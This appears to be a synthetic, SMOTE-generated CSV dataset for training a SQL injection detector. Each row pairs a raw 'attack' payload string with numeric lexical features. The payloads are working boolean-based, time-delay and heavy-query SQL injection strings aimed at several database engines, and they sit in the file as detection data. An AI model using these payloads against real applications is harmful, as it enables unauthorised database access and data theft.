id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000028,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000612,1.4043961120790405,104.26517250171092,29.420448249486725,3.573234434087766,31.473482749828907,13.0,44.26517250171092,15.526517250171093,0.3027883673596805,0.12497013784429228,0.4232147484109587,0.14902674638506852,1.0,0.0,2.0,0.0,1.0,1.0,0.0,8.053034500342184,0.4734827498289077,1.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.4734827498289078,0.5265172501710922,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000029,attack,boolean,"-3347%"" or 9323  =  9323#",nearest_attack_euclidean,R000290,1.427181442736637,23.54012383612472,14.053498448166298,3.447338091720993,2.4866253879584264,10.540123836124724,6.000000000000007,4.513374612041575,0.10742797641220217,0.4454938361265844,0.25592592178773027,0.1911522656734832,0.0,1.0,0.5133746120415748,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.513374612041575,0.0,1.0,0.0,1.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.48662538795842525,0.5133746120415748,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000030,attack,boolean,"1   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2952  =  2952",nearest_attack_euclidean,R000702,0.5775850752647451,282.3269729139574,35.756997537632486,3.5562663446809726,74.24300246236751,36.51399507526497,126.05598030105992,45.51399507526497,0.26306901915919956,0.1293173338280714,0.44640929508023475,0.1612043519324943,0.0,0.0,0.0,0.0,0.0,2.0,0.0,27.513995075264972,0.0,2.0,4.0,12.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.2430024623675116,0.7569975376324884,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,9.0
SMOTE_000031,attack,boolean,"1%""  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000178,0.5671172702405776,191.0631282359373,29.141354089620542,3.5741183704335104,104.92177414631678,11.43458364151784,53.56541635848216,21.141354089620542,0.5458189707756791,0.05959899913370778,0.2829880866584676,0.1115939434321455,0.0,3.9999999999999996,0.0,0.0,1.0,2.0,0.0,6.28270817924108,1.9999999999999998,0.0,5.43458364151784,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.1413540896205403,0.8586459103794597,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000032,attack,boolean,"1%""  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000309,1.1787629994045896,126.09885175559104,30.0,3.7102813358750977,47.70500704735648,11.371152942646605,47.696922354117284,19.325769411470677,0.3674244080487723,0.09328927213959198,0.3845296303690854,0.15475668944255036,0.0,3.9999999999999996,0.0,0.0,1.0,2.0,0.0,7.348461177058642,1.9999999999999998,0.674230588529321,1.325769411470679,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.674230588529321,0.32576941147067895,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000033,attack,boolean,"1%""   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000472,0.06668960013480803,375.6411891663289,36.039867870407896,3.517492950181717,94.15947148163158,45.0,169.60132129592103,66.8803963887763,0.25069601729064067,0.11980080297987639,0.45146718359228566,0.17803599613719728,0.0,3.9999999999999996,0.0,0.0,0.0,3.0,0.0,33.9202642591842,1.9601321295921024,3.0,0.0,23.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000034,attack,boolean,1%' and 9127  =  7687--,nearest_attack_euclidean,R000280,1.693797192622591,24.246361761680944,14.0,3.4846976845672963,2.584546079439683,10.246361761680948,6.000000000000007,5.415453920560317,0.10820313468573561,0.420483385724972,0.2483642632607263,0.2229492163285661,0.5845460794396843,0.4154539205603156,2.4154539205603154,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,3.4154539205603154,0.5845460794396844,0.4154539205603156,1.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.5845460794396844,0.4154539205603156,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000035,attack,boolean,"1   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  7484  =  7484",nearest_attack_euclidean,R000135,0.3617965310011887,226.8668123996868,32.0,3.4971240947251676,55.84762945712049,34.54288837136146,102.78103565696388,33.695258914240966,0.24625907690257196,0.15222876009043843,0.45298484159393326,0.1485273214130564,0.0,0.0,0.0,0.0,0.0,2.0,0.0,21.69525891424097,0.0,1.0,3.0,8.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.8476294571204854,0.15237054287951474,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,7.0
SMOTE_000036,attack,boolean,"1'   )    )    as prxm where 1267  =  1267 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000194,0.07234315399501125,156.17429404256364,35.817429404256366,4.18641465773337,75.45228821276909,16.0,47.904576425538174,16.817429404256362,0.48340741104305085,0.10260554463946898,0.30629162846952,0.10769541584796018,1.0,0.0,2.0,0.0,1.0,2.0,0.0,5.817429404256362,0.0,0.0,2.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000037,attack,boolean,"1%'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000577,0.15164118008031036,169.08563355502793,30.0,3.6939815450808586,72.08563355502793,8.0,65.0,24.0,0.42608549876101864,0.047333154741359296,0.38458188227354423,0.14199946422407786,4.0,0.0,0.0,0.0,1.0,2.0,0.0,10.0,1.9999999999999998,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000038,attack,boolean,1%'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ',nearest_attack_euclidean,R000727,0.6031444527562705,357.49172546927736,29.332545282788317,3.1752868408891266,82.9952716967299,47.0,173.66272641394158,53.83372735860584,0.23200373949251163,0.13153211979618806,0.48578552444308565,0.15067861626821463,4.0,0.0,0.0,0.0,0.0,1.8337273586058414,0.0,36.33254528278832,1.6674547172116823,0.0,0.0,11.833727358605842,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.0
SMOTE_000039,attack,boolean,"1'  )   where 2775  =  2775 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000335,0.7555289287737949,145.56421248294296,32.23929791950951,3.842214853310947,41.23929791950951,23.760702080490493,55.04280832196197,25.521404160980985,0.28344883882700034,0.16323067044152417,0.3780429837546969,0.1752775069767785,0.7607020804904918,0.0,2.0,0.0,0.0,2.0,0.0,10.760702080490493,0.0,2.0,1.0,10.0,0.7607020804904919,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.23929791950950807,0.760702080490492,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000040,attack,boolean,"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000769,0.10909305311532137,128.506554449704,28.3013108899408,3.9041226187226314,72.0,8.903932669822401,35.6026217798816,12.0,0.5604586065152297,0.06912115327307403,0.2770104724591579,0.09340976775253829,0.0,0.0,0.0,0.0,1.0,1.0,0.0,5.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000041,attack,boolean,-7720   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8254  =  8254,nearest_attack_euclidean,R000533,1.251545920253968,378.4691792474455,29.781311321063637,3.1540184059937824,83.12524528425456,54.87475471574545,187.1252452842545,53.34393396319091,0.21952173626252197,0.1452229019031473,0.49440175343085246,0.14085360840347827,1.5626226421272735,0.0,1.0,0.0,0.0,2.0,0.0,38.78131132106363,0.0,0.0,0.0,13.0,0.39065566053181844,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.0
SMOTE_000042,attack,boolean,"1%'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000388,0.5562551631594326,145.4176645119218,32.706192869048515,3.332630212043006,34.58761426190297,14.26548217262129,71.73979660120348,24.824771476194066,0.24148913790904336,0.09774499445507752,0.49047452287848964,0.17029134475738947,5.853096434524257,0.0,0.0,0.9999999999999999,0.0,1.853096434524258,0.0,13.26548217262129,1.8530964345242578,0.0,1.0,2.8530964345242578,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.14690356547574207,0.0,0.0,0.0,1.0,0.853096434524258,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000043,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""%""  =  """,nearest_attack_euclidean,R000218,0.2704055433227444,119.38866114659244,30.0,4.229728541185906,72.0,4.0,27.823884288827028,15.564776857765406,0.6042575698710496,0.033569864992836096,0.23187325221168673,0.1302993129244276,0.0,3.0,0.0,0.0,1.0,1.0,0.0,2.5647768577654055,1.0,0.0,3.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000044,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'xlvt'  =  'xlvt",nearest_attack_euclidean,R000282,0.12474704034024271,133.42367030731387,31.0,4.216185973184073,80.0,4.0,33.64886026341189,15.774810043901983,0.5998904152439172,0.02999452076219586,0.2518962774771192,0.11821878651676769,3.0,0.0,0.0,0.0,1.0,1.0,0.0,3.774810043901982,0.0,0.0,3.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000045,attack,boolean,"1""   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""vcjt"" like ""vcjt",nearest_attack_euclidean,R000130,1.0357534706998748,266.66859060183333,35.80367449652679,3.6185709835049162,77.82817114003869,27.0,117.2269463078631,44.61347315393155,0.2905263685211946,0.10237979199772043,0.4401197717026514,0.1669740677784336,0.0,3.9999999999999996,0.0,0.0,0.0,1.3987751678244047,0.0,25.60734899305357,0.0,1.6012248321755953,3.6012248321755953,9.803674496526785,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.202449664351191,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,8.20244966435119
SMOTE_000046,attack,boolean,"1%""  )   and 7533  =  7533 and   (  ""%""  =  """,nearest_attack_euclidean,R000262,0.3047923816722778,49.0065974933332,14.33553249777773,2.9731559324981607,6.667766248888867,9.890354998518488,21.780709997036976,10.667766248888865,0.13545322618694877,0.20141326190241032,0.4444444444444444,0.21868906746619649,0.0,3.9999999999999996,0.0,0.0,0.0,2.0,0.0,2.4451774992592448,1.9999999999999998,0.0,0.22258874962962194,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000047,attack,boolean,"1' and elt  (  4249  =  4249,7259  )   and 'nsbj' like 'nsbj",nearest_attack_euclidean,R000504,0.511155073934634,64.48605223638609,24.55139477636139,3.8594953297356813,21.0,13.0,21.588841789108862,8.897210447277216,0.3275697388180696,0.2027812668873764,0.33204323025990057,0.1376057640346534,4.0,0.0,0.0,0.0,0.0,1.0,0.0,2.8972104472772164,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000048,attack,boolean,"-2373%""  )   or 9323  =  9323#",nearest_attack_euclidean,R000515,1.1499786413371929,32.711668469804025,13.602592993289782,2.9720024079246494,2.3012964966448877,11.096110510065326,13.012964966448912,6.301296496644893,0.06975688714507577,0.3490113621062492,0.38741219170549324,0.19381955904318174,0.0,1.0,0.6987035033551088,0.0,0.0,1.0,0.0,1.6025929932897824,1.0,0.0,0.0,1.6987035033551092,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.3012964966448912,0.6987035033551088,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000049,attack,boolean,-7021' or 3038  =  3038,nearest_attack_euclidean,R000138,0.04341694347743066,23.0,12.0,3.225364760834122,2.0,12.0,6.000000000000007,3.0,0.08695652173913043,0.5217391304347826,0.2608695652173913,0.13043478260869565,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000050,attack,boolean,1' where 4795  =  4795 and 4595  =  4595#,nearest_attack_euclidean,R000087,1.0761022709562749,42.09450010100615,16.27362502525154,3.3746916945879373,7.999999999999993,17.0,13.094500101006155,4.0,0.19037615132355057,0.40454932156254486,0.3098864514521293,0.09518807566177528,0.7263749747484614,0.0,0.0,0.0,0.0,2.0,0.0,0.27362502525153864,0.0,0.0,0.0,2.0,0.7263749747484612,0.0,0.0,1.0,0.0,1.0,0.27362502525153887,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000051,attack,boolean," select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000021,0.07974828598032768,65.0,21.89228580831547,3.506171139406045,26.0,5.107714191684529,24.0,9.892285808315473,0.4,0.07858021833360813,0.36923076923076925,0.15218901243562266,0.0,2.0,2.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.8922858083154716,6.0,0.0,1.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,1.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,5.0
SMOTE_000052,attack,boolean," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",nearest_attack_euclidean,R000009,0.776126364329084,59.0,22.0,3.6255647807017093,26.0,4.0,20.0,9.0,0.4406779661016949,0.06779661016949153,0.3389830508474576,0.15254237288135594,0.0,2.0,2.0,0.0,1.0,2.0,0.0,0.0,0.45990043129080505,0.0,0.540099568709195,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,5.0
SMOTE_000053,attack,boolean,"1 and make_set  (  6911  =  1867,1867  )  ",nearest_attack_euclidean,R000602,0.006919386127571707,41.9751647808948,18.985098868536888,3.541760644115441,9.980131824715848,13.0,14.0,4.995032956178964,0.23771807517961233,0.3097315687569932,0.33355707404599266,0.11899328201740178,0.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.9950329561789626,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000054,attack,boolean,"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000680,0.05266307025378829,98.8636896697138,30.961054191346804,3.7498900678108966,32.0,13.0,38.92210838269361,14.941581287020204,0.32371123524035555,0.13150768931639445,0.3936764199349833,0.1511046555082667,0.9805270956734011,0.0,2.0,0.0,1.0,1.0,0.0,6.980527095673401,0.9805270956734011,1.0,1.0,4.0,0.9805270956734012,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000055,attack,boolean,"1""   )    )    and 9198  =  9198--",nearest_attack_euclidean,R000512,0.12337287529467675,33.57509977662521,11.182100095732055,2.6883830207640447,3.0,9.0,15.635799808535893,5.939299968089317,0.08962385693913333,0.26887157081739993,0.4645050076952255,0.17699956454824128,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.9392999680893164,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
